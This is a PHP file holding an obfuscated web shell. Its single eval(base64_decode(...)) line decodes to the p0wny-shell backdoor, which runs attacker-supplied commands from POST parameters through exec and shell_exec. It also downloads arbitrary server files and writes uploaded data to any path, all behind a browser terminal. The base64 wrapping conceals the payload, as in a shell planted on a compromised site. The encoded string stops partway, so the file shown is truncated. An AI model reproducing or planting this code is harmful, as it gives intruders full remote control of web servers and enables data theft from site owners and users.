<?php/**/
eval(base64_decode("ZnVuY3Rpb24gZmVhdHVyZVNoZWxsKCRjbWQsICRjd2QpIHsKICAgICRzdGRvdXQgPSBhcnJheSgpOwoKICAgIGlmIChwcmVnX21hdGNoKCIvXlxzKmNkXHMqJC8iLCAkY21kKSkgewogICAgICAgIC8vIHBhc3MKICAgIH0gZWxzZWlmIChwcmVnX21hdGNoKCIvXlxzKmNkXHMrKC4rKVxzKigyPiYxKT8kLyIsICRjbWQpKSB7CiAgICAgICAgY2hkaXIoJGN3ZCk7CiAgICAgICAgcHJlZ19tYXRjaCgiL15ccypjZFxzKyhbXlxzXSspXHMqKDI+JjEpPyQvIiwgJGNtZCwgJG1hdGNoKTsKICAgICAgICBjaGRpcigkbWF0Y2hbMV0pOwogICAgfSBlbHNlaWYgKHByZWdfbWF0Y2goIi9eXHMqZG93bmxvYWRccytbXlxzXStccyooMj4mMSk/JC8iLCAkY21kKSkgewogICAgICAgIGNoZGlyKCRjd2QpOwogICAgICAgIHByZWdfbWF0Y2goIi9eXHMqZG93bmxvYWRccysoW15cc10rKVxzKigyPiYxKT8kLyIsICRjbWQsICRtYXRjaCk7CiAgICAgICAgcmV0dXJuIGZlYXR1cmVEb3dubG9hZCgkbWF0Y2hbMV0pOwogICAgfSBlbHNlIHsKICAgICAgICBjaGRpcigkY3dkKTsKICAgICAgICBleGVjKCRjbWQsICRzdGRvdXQpOwogICAgfQoKICAgIHJldHVybiBhcnJheSgKICAgICAgICAic3Rkb3V0IiA9PiAkc3Rkb3V0LAogICAgICAgICJjd2QiID0+IGdldGN3ZCgpCiAgICApOwp9CgpmdW5jdGlvbiBmZWF0dXJlUHdkKCkgewogICAgcmV0dXJuIGFycmF5KCJjd2QiID0+IGdldGN3ZCgpKTsKfQoKZnVuY3Rpb24gZmVhdHVyZUhpbnQoJGZpbGVOYW1lLCAkY3dkLCAkdHlwZSkgewogICAgY2hkaXIoJGN3ZCk7CiAgICBpZiAoJHR5cGUgPT0gJ2NtZCcpIHsKICAgICAgICAkY21kID0gImNvbXBnZW4gLWMgJGZpbGVOYW1lIjsKICAgIH0gZWxzZSB7CiAgICAgICAgJGNtZCA9ICJjb21wZ2VuIC1mICRmaWxlTmFtZSI7CiAgICB9CiAgICAkY21kID0gIi9iaW4vYmFzaCAtYyBcIiRjbWRcIiI7CiAgICAkZmlsZXMgPSBleHBsb2RlKCJcbiIsIHNoZWxsX2V4ZWMoJGNtZCkpOwogICAgcmV0dXJuIGFycmF5KAogICAgICAgICdmaWxlcycgPT4gJGZpbGVzLAogICAgKTsKfQoKZnVuY3Rpb24gZmVhdHVyZURvd25sb2FkKCRmaWxlUGF0aCkgewogICAgJGZpbGUgPSBAZmlsZV9nZXRfY29udGVudHMoJGZpbGVQYXRoKTsKICAgIGlmICgkZmlsZSA9PT0gRkFMU0UpIHsKICAgICAgICByZXR1cm4gYXJyYXkoCiAgICAgICAgICAgICdzdGRvdXQnID0+IGFycmF5KCdGaWxlIG5vdCBmb3VuZCAvIG5vIHJlYWQgcGVybWlzc2lvbi4nKSwKICAgICAgICAgICAgJ2N3ZCcgPT4gZ2V0Y3dkKCkKICAgICAgICApOwogICAgfSBlbHNlIHsKICAgICAgICByZXR1cm4gYXJyYXkoCiAgICAgICAgICAgICduYW1lJyA9PiBiYXNlbmFtZSgkZmlsZVBhdGgpLAogICAgICAgICAgICAnZmlsZScgPT4gYmFzZTY0X2VuY29kZSgkZmlsZSkKICAgICAgICApOwogICAgfQp9CgpmdW5jdGlvbiBmZWF0dXJlVXBsb2FkKCRwYXRoLCAkZmlsZSwgJGN3ZCkgewogICAgY2hkaXIoJGN3ZCk7CiAgICAkZiA9IEBmb3BlbigkcGF0aCwgJ3diJyk7CiAgICBpZiAoJGYgPT09IEZBTFNFKSB7CiAgICAgICAgcmV0dXJuIGFycmF5KAogICAgICAgICAgICAnc3Rkb3V0JyA9PiBhcnJheSgnSW52YWxpZCBwYXRoIC8gbm8gd3JpdGUgcGVybWlzc2lvbi4nKSwKICAgICAgICAgICAgJ2N3ZCcgPT4gZ2V0Y3dkKCkKICAgICAgICApOwogICAgfSBlbHNlIHsKICAgICAgICBmd3JpdGUoJGYsIGJhc2U2NF9kZWNvZGUoJGZpbGUpKTsKICAgICAgICBmY2xvc2UoJGYpOwogICAgICAgIHJldHVybiBhcnJheSgKICAgICAgICAgICAgJ3N0ZG91dCcgPT4gYXJyYXkoJ0RvbmUuJyksCiAgICAgICAgICAgICdjd2QnID0+IGdldGN3ZCgpCiAgICAgICAgKTsKICAgIH0KfQoKaWYgKGlzc2V0KCRfR0VUWyJmZWF0dXJlIl0pKSB7CgogICAgJHJlc3BvbnNlID0gTlVMTDsKCiAgICBzd2l0Y2ggKCRfR0VUWyJmZWF0dXJlIl0pIHsKICAgICAgICBjYXNlICJzaGVsbCI6CiAgICAgICAgICAgICRjbWQgPSAkX1BPU1RbJ2NtZCddOwogICAgICAgICAgICBpZiAoIXByZWdfbWF0Y2goJy8yPi8nLCAkY21kKSkgewogICAgICAgICAgICAgICAgJGNtZCAuPSAnIDI+JjEnOwogICAgICAgICAgICB9CiAgICAgICAgICAgICRyZXNwb25zZSA9IGZlYXR1cmVTaGVsbCgkY21kLCAkX1BPU1RbImN3ZCJdKTsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgY2FzZSAicHdkIjoKICAgICAgICAgICAgJHJlc3BvbnNlID0gZmVhdHVyZVB3ZCgpOwogICAgICAgICAgICBicmVhazsKICAgICAgICBjYXNlICJoaW50IjoKICAgICAgICAgICAgJHJlc3BvbnNlID0gZmVhdHVyZUhpbnQoJF9QT1NUWydmaWxlbmFtZSddLCAkX1BPU1RbJ2N3ZCddLCAkX1BPU1RbJ3R5cGUnXSk7CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgIGNhc2UgJ3VwbG9hZCc6CiAgICAgICAgICAgICRyZXNwb25zZSA9IGZlYXR1cmVVcGxvYWQoJF9QT1NUWydwYXRoJ10sICRfUE9TVFsnZmlsZSddLCAkX1BPU1RbJ2N3ZCddKTsKICAgIH0KCiAgICBoZWFkZXIoIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbiIpOwogICAgZWNobyBqc29uX2VuY29kZSgkcmVzcG9uc2UpOwogICAgZGllKCk7Cn0KCjwhRE9DVFlQRSBodG1sPgoKPGh0bWw+CgogICAgPGhlYWQ+CiAgICAgICAgPG1ldGEgY2hhcnNldD0iVVRGLTgiIC8+CiAgICAgICAgPHRpdGxlPnAwd255QHNoZWxsOn4jPC90aXRsZT4KICAgICAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCIgLz4KICAgICAgICA8c3R5bGU+CiAgICAgICAgICAgIGh0bWwsIGJvZHkgewogICAgICAgICAgICAgICAgbWFyZ2luOiAwOwogICAgICAgICAgICAgICAgcGFkZGluZzogMDsKICAgICAgICAgICAgICAgIGJhY2tncm91bmQ6ICMzMzM7CiAgICAgICAgICAgICAgICBjb2xvcjogI2VlZTsKICAgICAgICAgICAgICAgIGZvbnQtZmFtaWx5OiBtb25vc3BhY2U7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICo6Oi13ZWJraXQtc2Nyb2xsYmFyLXRyYWNrIHsKICAgICAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDhweDsKICAgICAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICMzNTM1MzU7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICo6Oi13ZWJraXQtc2Nyb2xsYmFyIHsKICAgICAgICAgICAgICAgIHdpZHRoOiA4cHg7CiAgICAgICAgICAgICAgICBoZWlnaHQ6IDhweDsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgKjo6LXdlYmtpdC1zY3JvbGxiYXItdGh1bWIgewogICAgICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogOHB4OwogICAgICAgICAgICAgICAgLXdlYmtpdC1ib3gtc2hhZG93OiBpbnNldCAwIDAgNnB4IHJnYmEoMCwwLDAsLjMpOwogICAgICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2JjYmNiYzsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgI3NoZWxsIHsKICAgICAgICAgICAgICAgIGJhY2tncm91bmQ6ICMyMjI7CiAgICAgICAgICAgICAgICBtYXgtd2lkdGg6IDgwMHB4OwogICAgICAgICAgICAgICAgbWFyZ2luOiA1MHB4IGF1dG8gMCBhdXRvOwogICAgICAgICAgICAgICAgYm94LXNoYWRvdzogMCAwIDVweCByZ2JhKDAsIDAsIDAsIC4zKTsKICAgICAgICAgICAgICAgIGZvbnQtc2l6ZTogMTBwdDsKICAgICAgICAgICAgICAgIGRpc3BsYXk6IGZsZXg7CiAgICAgICAgICAgICAgICBmbGV4LWRpcmVjdGlvbjogY29sdW1uOwogICAgICAgICAgICAgICAgYWxpZ24taXRlbXM6IHN0cmV0Y2g7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICNzaGVsbC1jb250ZW50IHsKICAgICAgICAgICAgICAgIGhlaWdodDogNTAwcHg7CiAgICAgICAgICAgICAgICBvdmVyZmxvdzogYXV0bzsKICAgICAgICAgICAgICAgIHBhZGRpbmc6IDVweDsKICAgICAgICAgICAgICAgIHdoaXRlLXNwYWNlOiBwcmUtd3JhcDsKICAgICAgICAgICAgICAgIGZsZXgtZ3JvdzogMTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgI3NoZWxsLWxvZ28gewogICAgICAgICAgICAgICAgZm9udC13ZWlnaHQ6IGJvbGQ7CiAgICAgICAgICAgICAgICBjb2xvcjogI0ZGNDE4MDsKICAgICAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgQG1lZGlhIChtYXgtd2lkdGg6IDk5MXB4KSB7CiAgICAgICAgICAgICAgICAjc2hlbGwtbG9nbyB7CiAgICAgICAgICAgICAgICAgICAgZm9udC1zaXplOiA2cHg7CiAgICAgICAgICAgICAgICAgICAgbWFyZ2luOiAtMjVweCAwOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGh0bWwsIGJvZHksICNzaGVsbCB7CiAgICAgICAgICAgICAgICAgICAgaGVpZ2h0OiAxMDAlOwogICAgICAgICAgICAgICAgICAgIHdpZHRoOiAxMDAlOwogICAgICAgICAgICAgICAgICAgIG1heC13aWR0aDogbm9uZTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAjc2hlbGwgewogICAgICAgICAgICAgICAgICAgIG1hcmdpbi10b3A6IDA7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIEBtZWRpYSAobWF4LXdpZHRoOiA3NjdweCkgewogICAgICAgICAgICAgICAgI3NoZWxsLWlucHV0IHsKICAgICAgICAgICAgICAgICAgICBmbGV4LWRpcmVjdGlvbjogY29sdW1uOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICBAbWVkaWEgKG1heC13aWR0aDogMzIwcHgpIHsKICAgICAgICAgICAgICAgICNzaGVsbC1sb2dvIHsKICAgICAgICAgICAgICAgICAgICBmb250LXNpemU6IDVweDsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgLnNoZWxsLXByb21wdCB7CiAgICAgICAgICAgICAgICBmb250LXdlaWdodDogYm9sZDsKICAgICAgICAgICAgICAgIGNvbG9yOiAjNzVERjBCOwogICAgICAgICAgICB9CgogICAgICAgICAgICAuc2hlbGwtcHJvbXB0ID4gc3BhbiB7CiAgICAgICAgICAgICAgICBjb2xvcjogIzFCQzlFNzsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgI3NoZWxsLWlucHV0IHsKICAgICAgICAgICAgICAgIGRpc3BsYXk6IGZsZXg7CiAgICAgICAgICAgICAgICBib3gtc2hhZG93OiAwIC0xcHggMCByZ2JhKDAsIDAsIDAsIC4zKTsKICAgICAgICAgICAgICAgIGJvcmRlci10b3A6IHJnYmEoMjU1LCAyNTUsIDI1NSwgLjA1KSBzb2xpZCAxcHg7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICNzaGVsbC1pbnB1dCA+IGxhYmVsIHsKICAgICAgICAgICAgICAgIGZsZXgtZ3JvdzogMDsKICAgICAgICAgICAgICAgIGRpc3BsYXk6IGJsb2NrOwogICAgICAgICAgICAgICAgcGFkZGluZzogMCA1cHg7CiAgICAgICAgICAgICAgICBoZWlnaHQ6IDMwcHg7CiAgICAgICAgICAgICAgICBsaW5lLWhlaWdodDogMzBweDsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgI3NoZWxsLWlucHV0ICNzaGVsbC1jbWQgewogICAgICAgICAgICAgICAgaGVpZ2h0OiAzMHB4OwogICAgICAgICAgICAgICAgbGluZS1oZWlnaHQ6IDMwcHg7CiAgICAgICAgICAgICAgICBib3JkZXI6IG5vbmU7CiAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kOiB0cmFuc3BhcmVudDsKICAgICAgICAgICAgICAgIGNvbG9yOiAjZWVlOwogICAgICAgICAgICAgICAgZm9udC1mYW1pbHk6IG1vbm9zcGFjZTsKICAgICAgICAgICAgICAgIGZvbnQtc2l6ZTogMTBwdDsKICAgICAgICAgICAgICAgIHdpZHRoOiAxMDAlOwogICAgICAgICAgICAgICAgYWxpZ24tc2VsZjogY2VudGVyOwogICAgICAgICAgICB9CgogICAgICAgICAgICAjc2hlbGwtaW5wdXQgZGl2IHsKICAgICAgICAgICAgICAgIGZsZXgtZ3JvdzogMTsKICAgICAgICAgICAgICAgIGFsaWduLWl0ZW1zOiBzdHJldGNoOwogICAgICAgICAgICB9CgogICAgICAgICAgICAjc2hlbGwtaW5wdXQgaW5wdXQgewogICAgICAgICAgICAgICAgb3V0bGluZTogbm9uZTsKICAgICAgICAgICAgfQogICAgICAgIDwvc3R5bGU+CgogICAgICAgIDxzY3JpcHQ+CiAgICAgICAgICAgIHZhciBDV0QgPSBudWxsOwogICAgICAgICAgICB2YXIgY29tbWFuZEhpc3RvcnkgPSBbXTsKICAgICAgICAgICAgdmFyIGhpc3RvcnlQb3NpdGlvbiA9IDA7CiAgICAgICAgICAgIHZhciBlU2hlbGxDbWRJbnB1dCA9IG51bGw7CiAgICAgICAgICAgIHZhciBlU2hlbGxDb250ZW50ID0gbnVsbDsKCiAgICAgICAgICAgIGZ1bmN0aW9uIF9pbnNlcnRDb21tYW5kKGNvbW1hbmQpIHsKICAgICAgICAgICAgICAgIGVTaGVsbENvbnRlbnQuaW5uZXJIVE1MICs9ICJcblxuIjsKICAgICAgICAgICAgICAgIGVTaGVsbENvbnRlbnQuaW5uZXJIVE1MICs9ICc8c3BhbiBjbGFzcz1cInNoZWxsLXByb21wdFwiPicgKyBnZW5Qcm9tcHQoQ1dEKSArICc8L3NwYW4+ICc7CiAgICAgICAgICAgICAgICBlU2hlbGxDb250ZW50LmlubmVySFRNTCArPSBlc2NhcGVIdG1sKGNvbW1hbmQpOwogICAgICAgICAgICAgICAgZVNoZWxsQ29udGVudC5pbm5lckhUTUwgKz0gIlxuIjsKICAgICAgICAgICAgICAgIGVTaGVsbENvbnRlbnQuc2Nyb2xsVG9wID0gZVNoZWxsQ29udGVudC5zY3JvbGxIZWlnaHQ7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGZ1bmN0aW9uIF9pbnNlcnRTdGRvdXQoc3Rkb3V0KSB7CiAgICAgICAgICAgICAgICBlU2hlbGxDb250ZW50LmlubmVySFRNTCArPSBlc2NhcGVIdG1sKHN0ZG91dCk7CiAgICAgICAgICAgICAgICBlU2hlbGxDb250ZW50LnNjcm9sbFRvcCA9IGVTaGVsbENvbnRlbnQuc2Nyb2xsSGVpZ2h0OwogICAgICAgICAgICB9CgogICAgICAgICAgICBmdW5jdGlvbiBfZGVmZXIoY2FsbGJhY2spIHsKICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoY2FsbGJhY2ssIDApOwogICAgICAgICAgICB9CgogICAgICAgICAgICBmdW5jdGlvbiBmZWF0dXJlU2hlbGwoY29tbWFuZCkgewoKICAgICAgICAgICAgICAgIF9pbnNlcnRDb21tYW5kKGNvbW1hbmQpOwogICAgICAgICAgICAgICAgaWYgKC9eXHMqdXBsb2FkXHMrW15cc10rXHMqJC8udGVzdChjb21tYW5kKSkgewogICAgICAgICAgICAgICAgICAgIGZlYXR1cmVVcGxvYWQoY29tbWFuZC5tYXRjaCgvXlxzKnVwbG9hZFxzKyhbXlxzXSspXHMqJC8pWzFdKTsKICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoL15ccypjbGVhclxzKiQvLnRlc3QoY29tbWFuZCkpIHsKICAgICAgICAgICAgICAgICAgICAvLyBCYWNrZW5kIHNoZWxsIFRFUk0gZW52aXJvbm1lbnQgdmFyaWFibGUgbm90IHNldC4gQ2xlYXIgY29tbWFuZCBoaXN0b3J5IGZyb20gVUkgYnV0IGtlZXAgaW4gYnVmZmVyCiAgICAgICAgICAgICAgICAgICAgZVNoZWxsQ29udGVudC5pbm5lckhUTUwgPSAnJzsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgbWFrZVJlcXVlc3QoIj9mZWF0dXJlPXNoZWxsIiwge2NtZDogY29tbWFuZCwgY3dkOiBDV0R9LCBmdW5jdGlvbiAocmVzcG9uc2UpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHJlc3BvbnNlLmhhc093blByb3BlcnR5KCdmaWxlJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZlYXR1cmVEb3dubG9hZChyZXNwb25zZS5uYW1lLCByZXNwb25zZS5maWxlKQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX2luc2VydFN0ZG91dChyZXNwb25zZS5zdGRvdXQuam9pbigiXG4iKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cGRhdGVDd2QocmVzcG9uc2UuY3dkKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICBmdW5jdGlvbiBmZWF0dXJlSGludCgpIHsKICAgICAgICAgICAgICAgIGlmIChlU2hlbGxDbWRJbnB1dC52YWx1ZS50cmltKCkubGVuZ3RoID09PSAwKSByZXR1cm47ICAvLyBmaWVsZCBpcyBlbXB0eSAtPiBub3RoaW5nIHRvIGNvbXBsZXRlCgogICAgICAgICAgICAgICAgZnVuY3Rpb24gX3JlcXVlc3RDYWxsYmFjayhkYXRhKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKGRhdGEuZmlsZXMubGVuZ3RoIDw9IDEpIHJldHVybjsgIC8vIG5vIGNvbXBsZXRpb24KCiAgICAgICAgICAgICAgICAgICAgaWYgKGRhdGEuZmlsZXMubGVuZ3RoID09PSAyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICh0eXBlID09PSAnY21kJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgZVNoZWxsQ21kSW5wdXQudmFsdWUgPSBkYXRhLmZpbGVzWzBdOwogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGN1cnJlbnRWYWx1ZSA9IGVTaGVsbENtZElucHV0LnZhbHVlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgZVNoZWxsQ21kSW5wdXQudmFsdWUgPSBjdXJyZW50VmFsdWUucmVwbGFjZSgvKFteXHNdKikkLywgZGF0YS5maWxlc1swXSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICBfaW5zZXJ0Q29tbWFuZChlU2hlbGxDbWRJbnB1dC52YWx1ZSk7CiAgICAgICAgICAgICAgICAgICAgICAgIF9pbnNlcnRTdGRvdXQoZGF0YS5maWxlcy5qb2luKCJcbiIpKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgdmFyIGN1cnJlbnRDbWQgPSBlU2hlbGxDbWRJbnB1dC52YWx1ZS5zcGxpdCgiICIpOwogICAgICAgICAgICAgICAgdmFyIHR5cGUgPSAoY3VycmVudENtZC5sZW5ndGggPT09IDEpID8gImNtZCIgOiAiZmlsZSI7CiAgICAgICAgICAgICAgICB2YXIgZmlsZU5hbWUgPSAodHlwZSA9PT0gImNtZCIpID8gY3VycmVudENtZFswXSA6IGN1cnJlbnRDbWRbY3VycmVudENtZC5sZW5ndGggLSAxXTsKCiAgICAgICAgICAgICAgICBtYWtlUmVxdWVzdCgKICAgICAgICAgICAgICAgICAgICAiP2ZlYXR1cmU9aGludCIsCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBmaWxlbmFtZTogZmlsZU5hbWUsCiAgICAgICAgICAgICAgICAgICAgICAgIGN3ZDogQ1dELAogICAgICAgICAgICAgICAgICAgICAgICB0eXBlOiB0eXBlCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICBfcmVxdWVzdENhbGxiYWNrCiAgICAgICAgICAgICAgICApOwoKICAgICAgICAgICAgfQoKICAgICAgICAgICAgZnVuY3Rpb24gZmVhdHVyZURvd25sb2FkKG5hbWUsIGZpbGUpIHsKICAgICAgICAgICAgICAgIHZhciBlbGVtZW50ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnYScpOwogICAgICAgICAgICAgICAgZWxlbWVudC5zZXRBdHRyaWJ1dGUoJ2hyZWYnLCAnZGF0YTphcHBsaWNhdGlvbi9vY3RldC1zdHJlYW07YmFzZTY0LCcgKyBmaWxlKTsKICAgICAgICAgICAgICAgIGVsZW1lbnQuc2V0QXR0cmlidXRlKCdkb3dubG9hZCcsIG5hbWUpOwogICAgICAgICAgICAgICAgZWxlbWVudC5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOwogICAgICAgICAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChlbGVtZW50KTsKICAgICAgICAgICAgICAgIGVsZW1lbnQuY2xpY2soKTsKICAgICAgICAgICAgICAgIGRvY3VtZW50LmJvZHkucmVtb3ZlQ2hpbGQoZWxlbWVudCk7CiAgICAgICAgICAgICAgICBfaW5zZXJ0U3Rkb3V0KCdEb25lLicpOwogICAgICAgICAgICB9CgogICAgICAgICAgICBmdW5jdGlvbiBmZWF0dXJlVXBsb2FkKHBhdGgpIHsKICAgICAgICAgICAgICAgIHZhciBlbGVtZW50ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaW5wdXQnKTsKICAgICAgICAgICAgICAgIGVsZW1lbnQuc2V0QXR0cmlidXRlKCd0eXBlJywgJ2ZpbGUnKTsKICAgICAgICAgICAgICAgIGVsZW1lbnQuc3R5bGUuZGlzcGxheSA9ICdub25lJzsKICAgICAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoZWxlbWVudCk7CiAgICAgICAgICAgICAgICBlbGVtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgICAgICB2YXIgcHJvbWlzZSA9IGdldEJhc2U2NChlbGVtZW50LmZpbGVzWzBdKTsKICAgICAgICAgICAgICAgICAgICBwcm9taXNlLnRoZW4oZnVuY3Rpb24gKGZpbGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgbWFrZVJlcXVlc3QoJz9mZWF0dXJlPXVwbG9hZCcsIHtwYXRoOiBwYXRoLCBmaWxlOiBmaWxlLCBjd2Q6IENXRH0sIGZ1bmN0aW9uIChyZXNwb25zZSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX2luc2VydFN0ZG91dChyZXNwb25zZS5zdGRvdXQuam9pbigiXG4iKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cGRhdGVDd2QocmVzcG9uc2UuY3dkKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgfSwgZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgICAgICAgICBfaW5zZXJ0U3Rkb3V0KCdBbiB1bmtub3duIGNsaWVudC1zaWRlIGVycm9yIG9jY3VycmVkLicpOwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBlbGVtZW50LmNsaWNrKCk7CiAgICAgICAgICAgICAgICBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKGVsZW1lbnQpOwogICAgICAgICAgICB9CgogICAgICAgICAgICBmdW5jdGlvbiBnZXRCYXNlNjQoZmlsZSwgb25Mb2FkQ2FsbGJhY2spIHsKICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUHJvbWlzZShmdW5jdGlvbihyZXNvbHZlLCByZWplY3QpIHsKICAgICAgICAgICAgICAgICAgICB2YXIgcmVhZGVyID0gbmV3IEZpbGVSZWFkZXIoKTsKICAgICAgICAgICAgICAgICAgICByZWFkZXIub25sb2FkID0gZnVuY3Rpb24oKSB7IHJlc29sdmUocmVhZGVyLnJlc3VsdC5tYXRjaCgvYmFzZTY0LCguKikkLylbMV0pOyB9OwogICAgICAgICAgICAgICAgICAgIHJlYWRlci5vbmVycm9yID0gcmVqZWN0OwogICAgICAgICAgICAgICAgICAgIHJlYWRlci5yZWFkQXNEYXRhVVJMKGZpbGUpOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGZ1bmN0aW9uIGdlblByb21wdChjd2QpIHsKICAgICAgICAgICAgICAgIGN3ZCA9IGN3ZCB8fCAifiI7CiAgICAgICAgICAgICAgICB2YXIgc2hvcnRDd2QgPSBjd2Q7CiAgICAgICAgICAgICAgICBpZiAoY3dkLnNwbGl0KCIvIikubGVuZ3RoID4gMykgewogICAgICAgICAgICAgICAgICAgIHZhciBzcGxpdHRlZEN3ZCA9IGN3ZC5zcGxpdCgiLyIpOwogICAgICAgICAgICAgICAgICAgIHNob3J0Q3dkID0gIuKApi8iICsgc3BsaXR0ZWRDd2Rbc3BsaXR0ZWRDd2QubGVuZ3RoLTJdICsgIi8iICsgc3BsaXR0ZWRDd2Rbc3BsaXR0ZWRDd2QubGVuZ3RoLTFdOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgcmV0dXJuICJwMHdueUBzaGVsbDo8c3BhbiB0aXRsZT1cIiIgKyBjd2QgKyAiXCI+IiArIHNob3J0Q3dkICsgIjwvc3Bhbj4jIjsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgZnVuY3Rpb24gdXBkYXRlQ3dkKGN3ZCkgewogICAgICAgICAgICAgICAgaWYgKGN3ZCkgewogICAgICAgICAgICAgICAgICAgIENXRCA9IGN3ZDsKICAgICAgICAgICAgICAgICAgICBfdXBkYXRlUHJvbXB0KCk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgbWFrZVJlcXVlc3QoIj9mZWF0dXJlPXB3ZCIsIHt9LCBmdW5jdGlvbihyZXNwb25zZSkgewogICAgICAgICAgICAgICAgICAgIENXRCA9IHJlc3BvbnNlLmN3ZDsKICAgICAgICAgICAgICAgICAgICBfdXBkYXRlUHJvbXB0KCk7CiAgICAgICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGZ1bmN0aW9uIGVzY2FwZUh0bWwoc3RyaW5nKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gc3RyaW5nCiAgICAgICAgICAgICAgICAgICAgLnJlcGxhY2UoLyYvZywgIiZhbXA7IikKICAgICAgICAgICAgICAgICAgICAucmVwbGFjZSgvPC9nLCAiJmx0OyIpCiAgICAgICAgICAgICAgICAgICAgLnJlcGxhY2UoLz4vZywgIiZndDsiKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgZnVuY3Rpb24gX3VwZGF0ZVByb21wdCgpIHsKICAgICAgICAgICAgICAgIHZhciBlU2hlbGxQcm9tcHQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgic2hlbGwtcHJvbXB0Iik7CiAgICAgICAgICAgICAgICBlU2hlbGxQcm9tcHQuaW5uZXJIVE1MID0gZ2VuUHJvbXB0KENXRCk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGZ1bmN0aW9uIF9vblNoZWxsQ21kS2V5RG93bihldmVudCkgewogICAgICAgICAgICAgICAgc3dpdGNoIChldmVudC5rZXkpIHsKICAgICAgICAgICAgICAgICAgICBjYXNlICJFbnRlciI6CiAgICAgICAgICAgICAgICAgICAgICAgIGZlYXR1cmVTaGVsbChlU2hlbGxDbWRJbnB1dC52YWx1ZSk7CiAgICAgICAgICAgICAgICAgICAgICAgIGluc2VydFRvSGlzdG9yeShlU2hlbGxDbWRJbnB1dC52YWx1ZSk7CiAgICAgICAgICAgICAgICAgICAgICAgIGVTaGVsbENtZElucHV0LnZhbHVlID0gIiI7CiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgIGNhc2UgIkFycm93VXAiOgogICAgICAgICAgICAgICAgICAgICAgICBpZiAoaGlzdG9yeVBvc2l0aW9uID4gMCkgewogICAg